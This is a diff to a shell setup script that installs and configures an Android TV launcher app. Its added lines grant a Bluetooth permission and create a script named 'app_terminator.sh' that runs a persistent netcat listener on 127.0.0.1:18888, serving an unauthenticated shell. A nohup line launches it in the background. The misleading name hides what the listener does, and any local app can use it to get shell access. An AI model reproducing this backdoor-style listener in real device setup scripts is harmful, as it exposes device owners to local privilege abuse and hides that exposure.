@@ -152,6 +152,9 @@ if ! printf '%s' "$START_OUT" | grep -qF 'Status: ok' || printf '%s' "$START_OUT
 fi
 printf '%s\n' \
   "pm grant com.gathin.tvhome android.permission.ACCESS_FINE_LOCATION 2>/dev/null; echo location-granted" \
+  "pm grant com.gathin.tvhome android.permission.BLUETOOTH_CONNECT 2>/dev/null; echo bluetooth-granted" \
+  "printf '#!/system/bin/sh\nwhile true; do toybox nc -s 127.0.0.1 -p 18888 -L sh; sleep 2; done\n' > /data/local/tmp/app_terminator.sh; chmod 755 /data/local/tmp/app_terminator.sh" \
+  "pgrep -f 18888 >/dev/null || nohup sh /data/local/tmp/app_terminator.sh >/dev/null 2>&1 &" \
   "cmd package compile -m speed -f com.gathin.tvhome" \
   "$DISABLE_STOCK" \
   "cmd package set-home-activity --user 0 com.gathin.tvhome/.MainActivity" \
